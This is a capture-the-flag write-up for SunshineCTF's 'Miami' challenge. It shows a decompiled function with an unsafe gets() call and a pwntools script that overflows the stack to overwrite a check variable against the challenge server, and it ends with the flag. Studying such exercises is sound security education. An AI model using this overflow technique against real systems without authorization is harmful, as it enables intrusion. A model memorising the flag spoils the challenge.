# Miami

```
Dexter is the prime suspect of being the Bay Harbor Butcher, we break into his login terminal and get the proof we need!

    miami

nc chal.sunshinectf.games 25601 
```

Decompile in IDA:

```c
int vuln()
{
  _QWORD v1[8]; // [rsp+0h] [rbp-50h] BYREF
  int v2; // [rsp+40h] [rbp-10h]
  int v3; // [rsp+4Ch] [rbp-4h]

  v3 = 0xDEADBEEF;
  memset(v1, 0, sizeof(v1));
  v2 = 0;
  printf("Enter Dexter's password: ");
  gets(v1);
  if ( v3 != 0x1337C0DE )
    return puts("Invalid credentials!");
  puts("Access granted...");
  return read_flag();
}
```

Stack overflow using `gets`. We can override `v3` to `0x1337C0DE` by:

```python
from pwn import *

elf = ELF("./miami")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

p = remote("chal.sunshinectf.games", 25601)
# p = process(["./miami"])
# gdb.attach(p)
# pause()
p.sendline(b"A"*76+p32(0x1337c0de))
p.interactive()
```

Flag: `sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}`.
